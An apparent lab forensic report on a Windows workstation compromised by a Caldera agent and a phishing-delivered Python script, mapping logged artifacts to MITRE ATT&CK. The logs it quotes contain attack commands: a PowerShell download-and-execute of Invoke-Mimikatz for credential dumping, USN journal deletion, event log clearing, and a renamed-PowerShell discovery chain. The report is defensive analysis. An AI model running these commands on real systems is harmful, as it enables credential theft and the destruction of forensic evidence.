# Adversary-Emulation-and-detection

## Introduction

During the scenario, I conducted a disk forensics investigation of a compromised workstation (Windows x64), in which I documented the chain of custody for the provided evidence (PCAP file and OVA file), analyzed and determined that the workstation was subjected to two attacks, documented the identified findings, mapped technical findings to MITRE ATT&CK, including the events timeline and supporting evidence, reconstructed the attacker activities:

- **Attack 1:** Phishing → Privilege Escalation → Execution → Discovery → Credential Access → Exfiltration
- **Attack 2:** Execution → Command and Control → Credential Access → Discovery → Collection → Exfiltration

I also provided recommendations for each identified technique and wrote a **Suricata rule** to detect exfiltration attempts.
# Executive Summary

On **05/07/2026**, the **DESKTOP-2A1O8LD** workstation within the **anmar** domain was subjected to two cyberattacks.

At approximately **06:38:45 UTC**, the workstation was compromised by the **anmar_hacking.exe** agent emulating the **Constantine Group**. Once executed, the agent established persistent communication with its C2 server, extracted sensitive credentials from memory, collected sensitive files from the system, staged the collected data, and exfiltrated it to an unauthorized destination. During the attack, multiple forensic artifacts, including the **USN Journal** and **event logs**, were removed, indicating an attempt to hide the malicious activity and evade detection.

At approximately **08:46:54 UTC**, the workstation was compromised by **NulltackKatz.py** emulating the **Blue Delta (APT28)** group. The attackers gained initial access through a phishing email containing a malicious attachment. After obtaining elevated privileges, the attachment was executed, enabling the attackers to perform system discovery, extract sensitive credentials from memory, and exfiltrate the collected data through a **Gmail account using encrypted SMTP**.

### Severity Assessment

**Critical**

## Affected Assets

- **Hostname:** `DESKTOP-2A1O8LD`
- **IP address:** `192.168.67.129`
- **MAC address:** `00:0c:29:e5:73:d4`
- **Domain:** `anmar`
- **Operating system:** 64-bit Windows 10 (22H2), build 19045
- **Hardware:** 64-bit Windows 10 (22H2), build 19045
- **Asset type:** Workstation
- **Compromised accounts:** `anmar`

## Business Impact

- Sensitive files and user credentials were exfiltrated to unauthorized destinations.
- The **anmar** account was compromised.
- The **DESKTOP-2A1O8LD** workstation was totally compromised and remotely controlled by the attacker's Command and Control (C2) server.
- The attacker had full visibility of the system and security controls.
- Forensic artifacts were deleted, reducing evidence availability.

## Adversary Profile

### Constantine Group

- **Name:** `20-Constantine Group_Golden_AnmaR`
- **Group:** Constantine Group
- **Motivation:** Financially motivated

### Blue Delta

- **Name:** Blue Delta
- **Group:** APT28
- **Motivation:** Political and military espionage

## Tools

| **Tools** | **Purpose** |
|---|---|
| **Wireshark** | was used to identify top talkers, analyze network connection activities, detect C2 beacon, confirm C2 communications and identify the exfiltration of `staged.zip` archive |
| **FTK Imager** | was used to mount and verify the integrity of the disk image enabling investigation while preserving evidence integrity |
| **Registry Ripper** | Eric_Zimmerman tool was used to parse extracted registry artifacts (SOFTWARE, SAM, SYSTEM, Amcache.hve, NTUSER.dat and Shellbags) and collect evidence |
| **EvtxECmd** | Eric_Zimmerman tool was used to parse event log and generate CSV output |
| **PECmd** | Eric_Zimmerman tool was used to parse prefetch directory and generate CSV output |
| **MFTExplorer** | Eric_Zimmerman was used to parse MFT file and generate CSV output |
| **NTFS Journal Viewer** | Was used to parse NTFS change journal |
| **TimelineExplorer** | Eric_Zimmerman was used to view CSV files |

# 1. Methodology Investigation Steps

## 1.1. System Profiling

| **Attribute** | **Source** | **Findings** |
|---|---|---|
| Computer name | `C:\Evidence\registry\SYSTEM:`<br>`ControlSet001\Control\ComputerName` | `DESKTOP-2A1O8LD` |
| Time zone | `C:\Evidence\registry\SYSTEM:`<br>`ControlSet001\Control\TimeZoneInformation` | Ekaterinburg Standard Time (UTC+05:00) |
| Users | `C:\Evidence\registry\SAM:`<br>`SAM\Domains\Account\Users\Names` | $, administrator, ahmed, ali, anmar, user-1 |
| Last logged on user | `C:\Evidence\registry\SOFTWARE:`<br>`\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI` | anmar |

## 1.2. Chain of custody
### 1.2.1. Evidence 1:3-windows_ovf_golden_constantine_group

<img width="975" height="738" alt="image" src="https://github.com/user-attachments/assets/bed184d0-62cb-4181-b9e5-1c461e7d4f42" /></br>

### 1.2.2.Evidence 2:20_constanatine_group_network_capture.png

<img width="975" height="910" alt="image" src="https://github.com/user-attachments/assets/b015d657-ccaf-493b-b70a-a5e99a9dd535" /></br>

## 1.3. Initial access artifact analysis: phishing email 
### 1.3.1. Artifact overview 
The USN journal showed a CREATE_FILE named phishing_email_BLUEDELTA_20260705_134744.txt at 08:48:09 UTC indicating the file was created on the system. Further investigation revealed that phisiing log located at C:\NulltackKatz\logs.
| **Artifact** | **Details** |
|---|---|
| **Artifact type** | Phishing email artifact |
| **Timestamp** | 05/07/2026 08:48:09 UTC |
| **Artifact name** | `phishing_email_BLUEDELTA_20260705_134744.txt` |
| **Sender email address** | `security@payroll-update.com` — Attackers used a payroll-related domain to mimic a legitimate business and lure the recipient into trusting and interacting with the email. |
| **Reply-to address** | `it-security@noreply.com` — Although the address appears legitimate, the domain does not match the legitimate company domain, indicating an attempt to redirect responses to an unauthorized mailbox. |
| **Recipient email address** | `finance@desktop-2a1o8ld.local` — The campaign targeted the finance department. |
| **Attachment** | `NulltacKatz.py` — A Python script attached to the phishing email, masquerading as the Mimikatz tool. |

<img width="975" height="483" alt="image" src="https://github.com/user-attachments/assets/78601e08-8c46-4e6e-a6f4-2916e4d6f188" />

## 1.4. Execution artifacts analysis
### 1.4.1.Finding 1: Execution of splundk.exe
#### 1.4.1.1.What is Amcache?
Amcache.hve is a windows program created to store information related to program executions. It records the programs recently run and lists the path of the file executed, located  at C:\Windows\appcompat\Programs\Amcache.hve
#### 1.4.1.2.Amchache artifact analysis
The analysis of Amcahe revealed the execution of caldera agent masquerading as splunkd.exe from C:\Users\public location at 06:13:27 UTC. Legitimate splunk executable is expected to run from C:\Program Files\Splunk\bin location, its execution from public directory location indicates an attempt to masquerade and evade detection.
The file was unsigned, indicating that it originated from unverified source.

| **Artifact** | **Details** |
|---|---|
| **Timeline** | 2026-07-05 06:13:27 UTC – 05-07-2026 06:21:34 UTC |
| **Location** | `C:\Users\public\\` |
| **Name** | `splunkd.exe` |
| **Size** | 7817728 bytes |
| **Publisher** | None (untrusted) |
| **Hash** | SHA1: `84b3ad73cfa4654fcdafd162a0cb1527c4bad510` |

<img width="975" height="496" alt="image" src="https://github.com/user-attachments/assets/52cb8cd8-99f2-41e2-bd45-4ae6318c806f" />

## 1.4.2.Finding 2: Execution of anmar_hacking.exe
#### 1.4.2.1.Amchache artifact analysis
An analysis of amcache revealed the execution of second caldera agent named anmar_hacking.exe from C:\Users\public\ at 06:38:48 UTC. This filename indicates a hacking tool rather than using legitimate windows application. The file was located in shared  C:\Users\public\ directory which is accessible to all users . 
The file was unsigned, indicating that it originated from unverified source.

| **Artifact** | **Details** |
|---|---|
| **Timeline** | 2026-07-05 06:38:45 UTC 05-07-2026 09:15:23 UTC |
| **Location** | `C:\Users\public\\` |
| **Name** | `anmar_hacking.exe` |
| **Size** | 7817728 bytes |
| **Publisher** | None (untrusted) |
| **Hash** | SHA1: `90b54b721c6a06e80377b2000db7195c62c3d19d` |

<img width="975" height="485" alt="image" src="https://github.com/user-attachments/assets/23fa5b55-9388-4ee6-a220-0a30ad46eb10" />

1.4.3.Finding 3:Execution of NulltacKatz_v1.3.py
1.4.3.1.Event log artifact analysis
The analysis of Sysmon Event ID1 revealed the execution of the attachment NulltackKatz_v1.3.py by the py.exe process PID 9756 under DESKTOP-2A1O8LD\anmar user context. 

| **Artifact** | **Details** |
|---|---|
| **Timeline** | 2026-07-05 08:47:44 UTC |
| **Commandline** | `C:\\Users\\anmar\\AppData\\Local\\Python\\pythoncore-3.14-64\\python.exe" .\\NulltackKatz_v1.3.py` |
| **Parent Image** | `C:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.PythonManager_26.0.240.0_x64__3847v3x7pw1km\\py.exe` |
| **USER context** | `DESKTOP-2A1O8LD\\anmar` |
| **Hash** | SHA256=`CCE21C0E8710E304273E98AC4B2B0F5ACEB639ACBCD2343CBAA5C4E81619C45B` |

<img width="975" height="483" alt="image" src="https://github.com/user-attachments/assets/aed0e77b-8eff-4324-9aec-87e32a1902bb" /><br>

### 1.4.3.Finding 3:Execution of NulltacKatz_v1.3.py
#### 1.4.3.1.Event log artifact analysis
The analysis of Sysmon Event ID1 revealed the execution of the attachment NulltackKatz_v1.3.py by the py.exe process PID 9756 under DESKTOP-2A1O8LD\anmar user context. 
## Process Execution Evidence

| Attribute | Details |
|---|---|
| **Timeline** | 2026-07-05 08:47:44 UTC |
| **Command Line** | `C:\Users\anmar\AppData\Local\Python\pythoncore-3.14-64\python.exe" .\NulltackKatz_v1.3.py` |
| **Parent Image** | `C:\Program Files\WindowsApps\PythonSoftwareFoundation.PythonManager_26.0.240.0_x64__3847v3x7pw1km\py.exe` |
| **User Context** | `DESKTOP-2A1O8LD\anmar` |
| **SHA-256** | `CCE21C0E8710E304273E98AC4B2B0F5ACEB639ACBCD2343CBAA5C4E81619C45B` |

<img width="975" height="483" alt="image" src="https://github.com/user-attachments/assets/77263dac-d642-4141-96c0-67690f798d5f" /><br>

#### 1.4.3.2.Prefetch artifact analysis
##### What is Prefetch?
Prefetch files are created by windows operating systems to make application startup faster. In digital forensics they provide valuable evidence of program execution including executed applications, last execution time and run counts.
##### Prefetch analysis
The analysis of prefetch confirmed the execution pf py.exe program at 08:47:54 UTC one time confirming the execution of the malicious program NulltackKatz_v1.3.py via py.exe program. A difference time approximately 10second observed between the execution of the malicious program and the py.exe,  indicating the required time to initialize python before executing NulltackKatz_v1.3.py.

<img width="975" height="481" alt="image" src="https://github.com/user-attachments/assets/3a50392d-6019-4ae4-a0e2-3bb07bd50c47" /><br>

## 1.5. Discovery artifact analysis 
### A. Finding 1: Discovery activity  performed by NulltacKatz.py tool
### 1.5.1.Local Account discovery artifact
#### 1.5.1.1.USN and prefetch artifact analysis
The analysis of USN journal revealed recorded events associated with NET1.exe and NET.exe processes at 08:48:09 UTC. The analysis of Prefetch further confirmed the execution of net command.

<img width="975" height="154" alt="image" src="https://github.com/user-attachments/assets/37e50342-51b5-4ae3-b560-81c05d1802fb" /><br>

<img width="975" height="209" alt="image" src="https://github.com/user-attachments/assets/58724d4a-c80f-438e-9c31-0fa98d1904d9" /><br>

#### 1.5.1.2.Event log artifact analysis
The analysis of event log Event ID1 confirmed the execution of net user command by the cmd.exe process PID 11692 at 08:48:08  UTC under DESKTOP-2A1O8LD\\anmar user context, allowing the agent to enumerate local accounts. The cmd.exe process initiated by python.exe  process PID 8060 ,which was executing the NulltacKatz_v1.3.py script. 

## User Account Discovery

| Attribute | Details |
|---|---|
| **Timeline** | 2026-07-05 08:48:09 UTC |
| **Image** | `C:\Windows\System32\cmd.exe` |
| **CommandLine** | `C:\Windows\system32\cmd.exe /c "net user"` |
| **ParentCommandLine** | `"C:\Users\anmar\AppData\Local\Python\pythoncore-3.14-64\python.exe" .\NulltackKatz_v1.3.py` |
| **User Context** | `DESKTOP-2A1O8LD\anmar` |

<img width="975" height="498" alt="image" src="https://github.com/user-attachments/assets/480f7205-831e-43d5-87b2-0071c04d8fac" /><br>

### 1.5.2.Network discovery artifact
#### 1.5.2.1.USN journal and prefetch artifact analysis
The analysis of USN journal revealed FILE_CREATE event associated with IPCONFIG.EXE file at 08:48:09 UTC. The analysis of Prefetch further confirmed the execution of ipconfig.exe at the same timestamp.

<img width="975" height="118" alt="image" src="https://github.com/user-attachments/assets/d2ab3e75-578d-440d-b60c-17ac3b1aa906" />br>

<img width="975" height="165" alt="image" src="https://github.com/user-attachments/assets/c78cdead-f118-42cd-a573-11ed40a22783" /><br>

#### 1.5.2.2.Event log artifact analysis
The analysis of event log Event ID1 confirmed the execution of ipconfig /all command by the cmd.exe process PID 4556 at 08:48:09  UTC under DESKTOP-2A1O8LD\\anmar user context, allowing the agent to enumerate network configuration information.

## Network Configuration Discovery

| Attribute | Details |
|---|---|
| **Timeline** | 2026-07-05 08:48:09 UTC |
| **Image** | `C:\Windows\System32\cmd.exe` |
| **CommandLine** | `C:\Windows\system32\cmd.exe /c "ipconfig /all"` |
| **ParentCommandLine** | `"C:\Users\anmar\AppData\Local\Python\pythoncore-3.14-64\python.exe" .\NulltackKatz_v1.3.py` |
| **User Context** | `DESKTOP-2A1O8LD\anmar` |

<img width="975" height="496" alt="image" src="https://github.com/user-attachments/assets/64c98010-f8bc-4abb-8289-865236b6a9d6" /><br>

### 1.5.3.Process discovery artifact
#### 1.5.3.1.USN journal and prefetch artifact analysis
The analysis of USN journal revealed FILE_CREATE event associated with TASKLIST.EXE file at 08:48:09 UTC. The analysis of Prefetch further confirmed the execution of net command at the same timestamp.

<img width="975" height="132" alt="image" src="https://github.com/user-attachments/assets/97e6bd9f-fce9-4dee-91e4-f6c4c885fd2c" /><br>

<img width="975" height="168" alt="image" src="https://github.com/user-attachments/assets/2c53703c-795a-479f-b7a2-1db6279243db" /><br>

#### 1.5.3.2.Event log artifact analysis
The analysis of event log Event ID1 confirmed the execution of tasklist command by the cmd.exe process PID 6796 at 08:48:09  UTC under DESKTOP-2A1O8LD\\anmar user context, allowing the agent to enumerate running processes. This activity corresponds to Mitre Attack Technique T1057 process discovery.

## Process Discovery

| Attribute | Details |
|---|---|
| **Timeline** | 2026-07-05 08:48:09 UTC |
| **Image** | `C:\Windows\System32\cmd.exe` |
| **CommandLine** | `C:\Windows\system32\cmd.exe /c "tasklist"` |
| **ParentCommandLine** | `"C:\Users\anmar\AppData\Local\Python\pythoncore-3.14-64\python.exe" .\NulltackKatz_v1.3.py` |
| **User Context** | `DESKTOP-2A1O8LD\anmar` |

<img width="975" height="498" alt="image" src="https://github.com/user-attachments/assets/382aef99-1d6e-4e60-bca7-c1ffb329dca3" /><br>

## B. Finding 2: Discovery activity performed by anmar_hacking.exe agent
### 1.5.4. Discovery using masqueraded powershell utility
##### 1.5.4.1.Amcahe analysis:
 The analysis of amcache registry hive revealed an executable named debug.exe with the original filename powershell.exe and executed from a temporary location C:\Windows\temp at 08:12:41 UTC. This activity indicates masquerading of powershell.exe utility.

<img width="975" height="497" alt="image" src="https://github.com/user-attachments/assets/a4993287-36f3-4db0-8a27-8a3d93c325e9" /><br>

#### 1.5.4.2.Prefetch artifacts analysis:
The analysis of prefetch confirmed the execution of debug.exe at the same timestamp with four recorded executions.

<img width="975" height="153" alt="image" src="https://github.com/user-attachments/assets/7de90d00-a28c-4199-b0a4-fd4c58c89a26" /><br>

#### 1.5.4.2.Event log analysis:
Further analysis of powershell event logs revealed Powershell session (event log 400,600,403) was initiated at 08:12:41 UTC .The agent copied  powershell.exe to the temporary location c:\windows\temp\ and renamed the powershell copy to debug.exe. The executable debug.exe was then used to perform reconnaissance activity by enumerating local users, local groups, processes and the HKLM\Software\Microsoft\Windows\CurrentVersion registry key justifying the execution count(four count) observed in Prefetch. The enumeration was then stored C:\windows\temp\debug.log file.

<img width="975" height="497" alt="image" src="https://github.com/user-attachments/assets/deca0aa8-94e3-4d9f-b4d4-a87ba1f553bb" /><br>

#### 1.5.4.4.USN journal artifacts analysis:
The analysis of USN journal revealed no artifact activity related to debug.exe. This absence is attributed to the agent deleting USN  journal using fsutil usn deletejournal /D C: command at 08:19:42 UTC. The deletion of USN journal removed the recorded NTFS journal change including the debug.exe.
The deletion of journal also confirmed by amcache.hve registry hive which recorded the execution of fsutil.exe windows utility at the same timestamp.

<img width="975" height="497" alt="image" src="https://github.com/user-attachments/assets/f7b607f5-e6e5-4d34-8f43-e252d4444c0b" /><br>

#### 1.5.4.5.MFT  artifacts analysis:
The analysis of MFT table confirmed the discovery activity performed by the masqueraded powershell utility, revealing the execution of debug.exe and the creation of reconnaissance file debug.log followed by a corresponding prefetch entry for debug.exe 

<img width="975" height="165" alt="image" src="https://github.com/user-attachments/assets/62776c43-e304-47c7-9d2f-d5db47ad2053" /><br>

### 1.5.6.Security software discovery 
#### 1.5.6.1.Event Logs artifact analysis
The analysis of event ID1 revealed the execution of wmic.exe process PID 7408 at 08:02:58 under DESKTOP-2A1O8LD\\anmar user context. The process was  initiated by powershell.exe PID 1824, which executed the command wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value, allowing the agent to enumerate installed antivirus.

## Security Software Discovery

| Attribute | Details |
|---|---|
| **Timeline** | 2026-07-05 08:02:58 UTC |
| **Image** | `C:\Windows\System32\wbem\WMIC.exe` |
| **CommandLine** | `wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value` |
| **ParentImage** | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| **User Context** | `DESKTOP-2A1O8LD\anmar` |

<img width="975" height="392" alt="image" src="https://github.com/user-attachments/assets/3127bae8-3442-466f-8d9e-47a06c7fa929" /><br>

#### 1.5.6.2.Prefetch artifact analysis
The Prefetch file analysis confirmed the execution of wmic.exe at the same time as the Sysmon event ID1 corroborating security software discovery activity.

<img width="975" height="172" alt="image" src="https://github.com/user-attachments/assets/d55ef719-0637-4ce0-932f-2b99483d2d11" /><br>

## 1.6. Privilege escalation artifact analysis 
The analysis of  4742 events (special privilege assigned to new logon) revealed an administrative logon associated with the DESKTOP-2A1O8LD\anmar account at 08:46:54 UTC. This logon occurred just before the execution of NulltackKatz_v1.3.py script, indicating that the attacker obtained an elevated security token before executing the script. The event recorded several privileged rights, including SeDebugPrivilege, indicating that the script was executed with  administrator privileges.
No privilege escalation technique was identified for the anmar_hacking.exe caldera agent, instead, the agent was launched with elevated administrator privileges.

<img width="975" height="366" alt="image" src="https://github.com/user-attachments/assets/24d3a556-6ae3-402d-90bc-aaf0d55d29d3" /><br>

## 1.7. Credential access artifact analysis 
### 1.7.1.Finding 1: Lsass memory accessed by anmar_hacking.exe
#### 1.7.1.1. Event log Credential access artifact
The analysis of event log Event ID1 revealed that invoke-mimikatz.ps1 was executed at 07:27:10 UTC with the DumpCreds parameter. This confirms that the powershell mimikatz script was executed in memory and was used to access lsass memory for credential dumping without leaving trace on the disk.

## Credential Dumping via PowerShell

| Attribute | Details |
|---|---|
| **Timeline** | 2026-07-05 07:27:10 UTC |
| **Image** | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| **ParentImage** | `C:\Users\Public\anmar_hacking.exe` |
| **CommandLine** | `powershell.exe -ExecutionPolicy Bypass -C "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");iex $result; Invoke-Mimikatz -DumpCreds"` |
| **SHA256** | `9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3` |
| **User Context** | `DESKTOP-2A1O8LD\anmar` |

<br>

### 1.7.2.Finding 2:Lsass memory accessed by mimikatz.exe
#### 1.7.2.1.USN journal and prefetch artifact
The analysis of USN revealed a File_Create event for mimikatz.exe at 08:48:10 UTC indicating that the executable was created on the system. The analysis of prefetch further confirmed the execution of mimikatz.exe at the same timestamp.

<img width="975" height="147" alt="image" src="https://github.com/user-attachments/assets/efd1b7e6-fcef-4879-b91a-5e5886e2e477" /><br>

<img width="975" height="183" alt="image" src="https://github.com/user-attachments/assets/eaa1efc9-a3f8-4b5f-8b84-862622461248" /><br>

#### 1.7.2.2.Event log Credential access artifact
#### Event ID 10:
The analysis of Sysmon Event ID10 revealed that mimikatz.exe PID 2946  accessed the lsass memory with 0x1010  granted access value under DESKTOP-2A1O8LD\anmar user context.

## LSASS Memory Access

| Attribute | Details |
|---|---|
| **Timeline** | 2026-07-05 08:49:09 UTC |
| **SourceImage** | `C:\Tools\mimikatz\x64\mimikatz.exe` |
| **TargetImage** | `C:\Windows\system32\lsass.exe` |
| **PID** | `2964` |
| **GrantedAccess** | `0x1010 (PROCESS_QUERY_LIMITED_INFORMATION & PROCESS_VM_READ)` |
| **User Context** | `DESKTOP-2A1O8LD\anmar` |

<img width="975" height="568" alt="image" src="https://github.com/user-attachments/assets/396e7ec9-48ce-44e6-91ba-e73870ceeb35" /><br>

## 1.8. Collection artifact analysis 
### 1.8.1.Powershell event logs collection artifacts analysis  
Powershell event logs(event 400,600,403)  revealed powershell session indicating an attempt to gather information from the file system. The agent searched for files with .png, .wav and .yml extension beginning at 08:05:44 UTC .

<img width="975" height="415" alt="image" src="https://github.com/user-attachments/assets/5ec29751-8b02-4b74-8560-4ea6e5a166c0" /><br>

Powershell logs also revealed a powershell session associated with the creation of staged directory at 08:07:49 UTC in a legitimate windows location C:\Windows\system32 to evade detection. 
The absence of supporting artifacts is attributed to the anti-forensic activities performed by the agent:
-	Usn journal: no usn artifacts were observed because the usn journal was deleted after the creation of the staged directory
-	Events logs: no event log artifacts were available  because the system and security logs were deleted  during the attack
-	MFT: no MFT entry for the staged directory was identified indicating that the directory was not removed by the agent 

<img width="975" height="314" alt="image" src="https://github.com/user-attachments/assets/92baae4e-fc2a-4262-899d-ef9a22eeef0d" /><br>

The collected data was then stored in the staged directory prior to the exfiltration phase, which began at 08:25:23 UTC.

<img width="975" height="442" alt="image" src="https://github.com/user-attachments/assets/17ff191d-3b59-4e06-bac3-ba007d9768d2" /><br> 

## 1.9. Exfiltration artifact analysis 
### 1.9.1.USN journal artifact analysis
The analysis of USN journal revealed the creation of staged.zip archive at 08:27:44 UTC indicating that the staged directory was compressed on the system.

<img width="975" height="144" alt="image" src="https://github.com/user-attachments/assets/59800777-e68a-4397-ba88-f52c89889b46" /><br>

### 1.9.2.Windows powershell event logs 
The analysis of the event ID 4103 (module logging) revealed the execution of compress-archive powershell command  to compress the staged directory located at C:\\Windows\\system32\\staged, which contained collected files at 08:27:44 UTC under DESKTOP-2A1O8LD\\anmar user context.

<img width="975" height="303" alt="image" src="https://github.com/user-attachments/assets/31cc36ae-344d-4547-ba2e-decad18420d1" /><br>

### 1.9.3.Pcapng file artifact analysis 
The analysis of network traffic capture (frame 22112) revealed that caldera agent with the paw id qktity, associated with anmar_hacking.exe  on 192.168.67.129, transmitted the compressed collection archive staged.zip (155287 bytes) to the deployed C2 server (listening on 8888 port) at 192.168.67.128/file/upload using http post method at 08:28:32 UTC.

<img width="945" height="815" alt="image" src="https://github.com/user-attachments/assets/e82f2f15-1562-4245-a1c0-b89e96088d97" /><br>

### 1.9.3.Event log analysis artifact analysis 
The analysis of event ID 11 File_Create revealed the creation of file named exfiltration_report_BLUEDELTA_20260705_134744.txt at 08:48:12 UTC under DESKTOP-2A1O8LD\\anmar. The file was stored at C:\NulltackKatz and was associated with the python.exe process PID 8060, indicating that the file generated as a part of exfiltration activity performed by nulltackKatz.py script.

Further analysis of the network traffic revealed an SMTP connection between the mail server (smtp.gmail.com - 173.174.222.108:587) and the client(192.168.67.129) smtp.gmail.com was observed at 08:48:11 UTC, immediately before the generation of the exfiltration log. The session successfully initiated TLS encryption using STARTTLS command. This may suggest the  SMTP protocol may be used for the exfiltration process; however, the network artifact cannot confirm that the exfiltration was performed over SMTP. 

<img width="975" height="290" alt="image" src="https://github.com/user-attachments/assets/5c7f3226-378b-4015-bbe3-cf750a5a727b" /><br>

## 1.10. Persistence  artifact analysis 
No persistence artifacts were identified the commonly abused locations, examined during investigation using registry explorer:
#### Registry run keys: 
C:\Evidence\users\anmar\NTUSER.DAT.copy0: SOFTWARE\Microsoft\Windows\CurrentVersion\Run
C:\Evidence\users\anmar\NTUSER.DAT.copy0: SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
C:\Evidence\regitry\SOFTWARE: Microsoft\Windows\CurrentVersion\RunOnce
C:\Evidence\regitry\SOFTWARE: Microsoft\Windows\CurrentVersion\Run
C:\Evidence\regitry\SOFTWARE: Microsoft\Windows\CurrentVersion\PoliciesWinlogon 
C:\Evidence\regitry\SOFTWARE: Microsoft\Windows NT\CurrentVersion\Winlogon
#### startup key folders: 
C:\Evidence\regitry\SOFTWARE: Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
C:\Evidence\users\anmar\NTUSER.DAT.copy0: SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
C:\Evidence\users\anmar\NTUSER.DAT.copy0: SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
#### scheduled tasks: 
C:\windows\system32\tasks
#### services: 
C:\Evidence\regitry\SYSTEM: ControlSet001\Services

## 1.11. Command and control artifact analysis 

| ***Contacted endpoint*** | ***Explanation*** |
| --- | --- |
| /beacon | - Multiple Post requests to /beacon endpoint were observed.<br><br>- These requests contained obfuscated base64 commands and instructions communicated between the caldera agent and the deployed server 192.168.67.128.<br><br>- Base64 encoded beacons were transmitted from the deployed server 192.168.67.128 to the caldera agent 192.168.67.129 from 07:17:24 UTC to 08:44:56 UTC. These beacons were observed with consistent interval (1 min), indicating persistent C2 communication.<br><br>One example of the observed beacon is:<br><br>`eyJwYXciOiAicWt0aXR5IiwgInNsZWVwIjogNDMsICJ3YXRjaGRvZyI6IDAsICJpbnN0cnVjdGlvbnMiOiAiW10ifQ==`<br><br>When decoded, the beacon contains json data:<br><br>`{"paw": "qktity", "sleep": 31, "watchdog": 0, "instructions": "[]"}`<br><br>All these activities identified suspicious C2 communications, enabling the attacker to exchange more commands with the compromised host and extract further data.<br><br>- 192.168.67.129: caldera agent<br><br>- 192.168.67.128: deployed C2 |

<img width="945" height="469" alt="image" src="https://github.com/user-attachments/assets/606da7d3-56c0-4d21-8678-a81d28ebf767" /><br>

## 1.12.Event Logs clearing
The agent cleared Security event log and system event log using  the command line clear-eventlog security clear-eventlog system at 08:13:32 UTC. This activity is supported by security event 1102 (security event log cleared) and system 104(system event log cleared), confirming windows event logs were cleared. This behavior indicated that the agent attempted to remove forensic evidence.
The investigation also identified a sysmon termination record for wevtutil.exe (Windows event management utility) at 10:06:12 UTC,however the corresponding process creation (Event ID1)  which normally contains the command used to launch the process was not present. The absence of process creation record along with the clearing of system and security event indicates that the agent attempted to evade detection and remove forensic traces by clearing event logs including sysmon.

# 2. Findings:
## 2.1.Initial access: Phishing attachment

| **Evidence source** | **Findings** |
|---|---|
| **Logs** | Phishing artifact logged on the system |
| **USN** | Confirms phishing file creation `phishing_email_BLUEDELTA_20260705_134744.txt` |

## 2.2.Execution:Malicious File

| **Evidence source** | **Findings** |
|---|---|
| **Amcache** | `splunkd.exe` agent executed from an unexpected location and masquerading as a legitimate Splunk executable. |
| **Amcache** | `anmar_hacking.exe` agent executed. |
| **EventID1** | `NulltacKatz_v1.3.py` executed through the `py.exe` process. |
| **Prefetch** | `py.exe` executed at the same time as `NulltacKatz_v1.3.py`. |

## 2.3.Discovery:
### 2.3.1.Local account discovery 

| **Evidence source** | **Findings** |
|---|---|
| **Event ID1** | Local user enumerated via `net user` command through `NulltakKatz_v1.3.py`. |
| **USN** | `NET1.exe` and `NET.exe` access logged. |
| **Prefetch** | `Net1.exe` and `NET.exe` executed. |

### 2.3.2.Network discovery 

| **Evidence source** | **Findings** |
|---|---|
| **Event ID1** | Network configuration enumerated using `ipconfig /all` command via `NulltakKatz_v1.3.py`. |
| **USN** | `IPCONFIG.EXE` file created. |
| **Prefetch** | `IPCONFIG.EXE` file executed. |

### 2.3.3.Process  discovery 

| **Evidence source** | **Findings** |
|---|---|
| **Event ID1** | Processes enumerated using the `tasklist` command via `NulltakKatz_v1.3.py`. |
| **USN** | `TASKLIST.EXE` file created. |
| **Prefetch** | `TASKLIST.EXE` file executed. |

### 2.3.4.Software security discovery 

| **Evidence source** | **Findings** |
|---|---|
| **Event ID1** | Installed antivirus software enumerated using the `wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value` command through the `anmar_hacking.exe` Caldera agent. |
| **Prefetch** | `WMIC.exe` executed. |

### 2.3.5.Discovery using masquerading windows utility

| **Evidence source** | **Findings** |
|---|---|
| **Amcache** | `Debug.exe` masqueraded as a PowerShell utility and was executed. `Fsutil.exe` was executed to delete NTFS USN journal record changes. |
| **PowerShell event log (400, 600, 403)** | PowerShell session initiated to perform discovery (local users, local groups, processes, and system registry configuration) using `powershell.exe -ExecutionPolicy Bypass -C Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log`. |
| **Prefetch** | `Debug.exe` executed. |
| **USN journal** | The agent deleted NTFS USN Journal record changes using `fsutil usn deletejournal /D C:`. |
| **Debug.log** | Discovery activity performed and stored. |

## 2.4.Privilege escalation: Access Token Manipulation

| **Evidence source** | **Findings** |
|---|---|
| **Event 4672** | Administrative logon associated with `DESKTOP-2A1O8LD\anmar`. The user was assigned an elevated security token to the logon session. |

## 2.5.Credential access: Credential dumping: lsass memory

| **Evidence source** | **Findings** |
|---|---|
| **Event ID1** | Mimikatz PowerShell script executed by the `powershell.exe` process in memory using `Invoke-Mimikatz.ps1`. Mimikatz accessed LSASS memory using `Invoke-Mimikatz -DumpCreds`. |
| **Event ID10** | `Mimikatz.exe` accessed LSASS memory with `0x1010` granted access. |
| **Prefetch** | `Mimikatz.exe` executed. |
| **USN** | `Mimikatz.exe` file created. |

## 2.6.Collection 

| **Evidence source** | **Findings** |
|---|---|
| **Powershell Logs (Event 400, 600, 403)** | The agent collected sensitive files from the system. The agent created a staged directory in a legitimate path, `C:\Windows\System32`, to evade detection. The collected files were then stored in the staged directory prior to the exfiltration phase. |

## 2.7.Exfiltration

| **Evidence source** | **Findings** |
|---|---|
